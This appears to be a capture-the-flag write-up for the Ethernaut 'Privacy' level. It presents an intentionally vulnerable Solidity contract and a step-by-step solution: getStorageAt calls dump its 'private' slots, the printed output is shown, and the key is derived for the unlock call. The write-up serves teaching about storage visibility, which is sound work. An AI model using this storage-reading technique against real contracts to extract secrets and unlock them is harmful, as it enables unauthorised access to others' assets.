# Privacy
Difficulty: 8/10

The creator of this contract was careful enough to protect the sensitive areas of its storage.

Unlock this contract to beat the level.

Things that might help:

* Understanding how storage works
* Understanding how parameter parsing works
* Understanding how casting works

Tips:

* Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.



``` Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```


# Solution
So Solidity stores data in slots. Each slot store is 32-bytes. Storage is optimized when the data is under 32 bytes. Multiple variables can be stored in the same slot. Another thing to know, is that strings and bytes32 are stored from left to right in these slots. However, int,bools, uint, are put into these slots from right to left.

You can access the storage slots for a contract using the command `await(web3.eth.getStorageAt(contractAddress, slotNumber))`

You can check the lock status using the command `await contract.locked()`

To view all the storage for this contract type the following:

``` javascript
//slot 0
await (web3.eth.getStorageAt('0x40d4c2d338769cE929CdeD0D243e24cb878b772A', 0))
//data: 0x0000000000000000000000000000000000000000000000000000000000000001

//slot 1
await (web3.eth.getStorageAt('0x40d4c2d338769cE929CdeD0D243e24cb878b772A', 1))
//data: 0x00000000000000000000000000000000000000000000000000000000628f882c

//slot 2
await (web3.eth.getStorageAt('0x40d4c2d338769cE929CdeD0D243e24cb878b772A', 2))
//data: 0x00000000000000000000000000000000000000000000000000000000882cff0a


//slot 3
await (web3.eth.getStorageAt('0x40d4c2d338769cE929CdeD0D243e24cb878b772A', 3))
//data: 0xefa462674ed8f6c39fd549bf075ccb60cef1b4b9ead03b9347fbb034af24c12c

//slot 4
await (web3.eth.getStorageAt('0x40d4c2d338769cE929CdeD0D243e24cb878b772A', 4))
//data: 0x0211f939955aef04bafbc13bacaf670d029bfe3fb949c008ddf9ec7c8db261ac

//slot 5
await (web3.eth.getStorageAt('0x40d4c2d338769cE929CdeD0D243e24cb878b772A', 5))
//data: 0x8a50c9600ba5a2b18ed9f751574ea6973a16eab5d2b9784e8b5af49b8cafd27b


```

Now looking at the contract we can see the following:

* Slot 0 - bool public locked
* Slot 1 - uint256 public ID
* Slot 2 - uint 8 private flattening, uint8 private denomination, uint16 private awkwardness 
* Slot 3 - bytes32[0] private data
* Slot 4 - bytes32[1] private data
* Slot 5 - bytes32[2] private data

Now reading the unlock(), the `key` is `bytes32[2] data` truncating to `bytes16`. Bytes are stored from left to write, so the _key is the 16 bytes on the left side of `bytes32[2] data` which is `0x8a50c9600ba5a2b18ed9f751574ea697`.

You can unlock the contract by typing `await contract.unlock('0x8a50c9600ba5a2b18ed9f751574ea697')`

The code to unlock can be viewed in `Unlocktor.js`

# Completion Message
```
Level completed!

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's getStorageAt(...) can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": How to read Ethereum contract storage
```

